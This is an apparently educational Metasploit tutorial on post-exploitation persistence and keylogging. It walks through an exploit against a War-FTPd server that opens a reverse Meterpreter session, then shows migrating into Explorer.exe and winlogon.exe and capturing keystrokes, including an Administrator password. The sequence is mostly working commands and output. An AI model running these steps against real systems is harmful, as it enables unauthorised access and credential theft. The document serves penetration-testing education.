---
draft: false
title: MSF Meterpreter Persistence
linkTitle: MSF Meterpreter Persistence
translationKey: msf-meterpreter-persistence
date: 2017-06-15T13:54:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: Providing persistence after logging in to the target system with Meterpreter.
url: /msf-meterpreter-persistence/
featured_image: /images/metasploit.jpg
categories:
    - Metasploit Framework
tags:
    - cybersecurity
    - metasploit framework
weight: 410
---
## Ensuring Persistence

When you successfully log in to a target computer, the first thing to consider is to ensure persistence, if the current permissions allow it. Persistence involves creating open doors for later entry into the target system or finding easier entry methods.

In some cases, the work you do on the target can make the system unstable. When the system needs to be restarted, your connection will also be lost. In such cases, it will be useful to create an easy way to reconnect to the target system.

In order to ensure persistence, the discovery of user information, token information, hash information and other subnets it is connected to is very useful for future use.

Another method of gathering information is the method called keylogging.

## Using Keyloggers in Metasploit

When logging into a system, you can take two approaches. Being very fast or being very slow. Keylogging, that is, recording the user's keystrokes and typing, is an example of the slow approach. In this approach, you cannot perform the operations you want to perform very quickly, but you can obtain very useful information in the long run.

First, steal a session on the target system using an exploit module.

```bash
msf exploit(warftpd_165_user) > exploit

> Handler binding to LHOST 0.0.0.0
> Started reverse handler
> Connecting to FTP server 172.16.104.145:21...
> Connected to target FTP server.
> Trying target Windows 2000 SP0-SP4 English...
> Transmitting intermediate stager for over-sized stage...(191 bytes)
> Sending stage (2650 bytes)
> Sleeping before handling stage...
> Uploading DLL (75787 bytes)...
> Upload completed.
> Meterpreter session 4 opened (172.16.104.130:4444 -> 172.16.104.145:1246)

meterpreter >
```

After logging in, switching to the `Explorer.exe` process to record the keys is a more guaranteed way to achieve success. We learn which PID number the `Explorer.exe` application is running on the target system and migrate with the `migrate` command.

```bash
meterpreter > ps

Process list
**============**

 PID Name Path
 --- ---- ----
 140 smss.exe \SystemRoot\System32\smss.exe
 188 winlogon.exe ??\C:\WINNT\system32\winlogon.exe
 216 services.exe C:\WINNT\system32\services.exe
 228 lsass.exe C:\WINNT\system32\lsass.exe
 380 svchost.exe C:\WINNT\system32\svchost.exe
 408 spoolsv.exe C:\WINNT\system32\spoolsv.exe
 444 svchost.exe C:\WINNT\System32\svchost.exe
 480 regsvc.exe C:\WINNT\system32\regsvc.exe
 500 MSTask.exe C:\WINNT\system32\MSTask.exe
 528 VMwareService.exe C:\Program Files\VMwareVMware Tools\VMwareService.exe
 588 WinMgmt.exe C:\WINNT\System32\WBEMWinMgmt.exe
 664 notepad.exe C:\WINNT\System32 otepad.exe
 724 cmd.exe C:\WINNT\System32\cmd.exe
 768 Explorer.exe C:\WINNT\Explorer.exe
 800 war-ftpd.exe C:\Program Files\War-ftpd\war-ftpd.exe
 888 VMwareTray.exe C:\Program Files\VMware\VMware Tools\VMwareTray.exe
 896 VMwareUser.exe C:\Program Files\VMware\VMware Tools\VMwareUser.exe
 940 firefox.exe C:\Program Files\Mozilla Firefox\firefox.exe
 972 TPAutoConnSvc.exe C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
 1088 TPAutoConnect.exe C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe

meterpreter > migrate 768
> Migrating to 768...
> Migration completed successfully.
meterpreter > getpid
Current pid: 768
```

After checking the PID transition, let's start the keylogger process.

```bash
meterpreter > keyscan_start
Starting the keystroke sniffer...
meterpreter > keyscan_dump
Dumping captured keystrokes...
tgoogle.cm my credit amex myusernamthi amexpasswordpassword
```

After some time has passed, you can use the `keyscan_dump` command to view the log file. When you examine the captured keystrokes, you can also learn how keys like CTRL or ALT are recorded in the log file.

If you also want to capture the login information, you can switch to the `winlogon` process with the `migrate` command instead of `Explorer.exe`.

```bash
meterpreter > ps

Process list
**=================**

PID Name         Path
--- ----         ----
401 winlogon.exe C:\WINNT\system32\winlogon.exe

meterpreter > migrate 401

> Migrating to 401...
> Migration completed successfully.

meterpreter > keyscan_start
Starting the keystroke sniffer...
```

An Administrator user session was opened during the registration. Let's look at the result.

```bash
meterpreter > keyscan_dump
Dumping captured keystrokes...
Administrator ohnoes1vebeenh4x0red!
```

As can be seen, the logged in user is "Administrator" and the password is "ohnoes1vebeenh4x0red!".
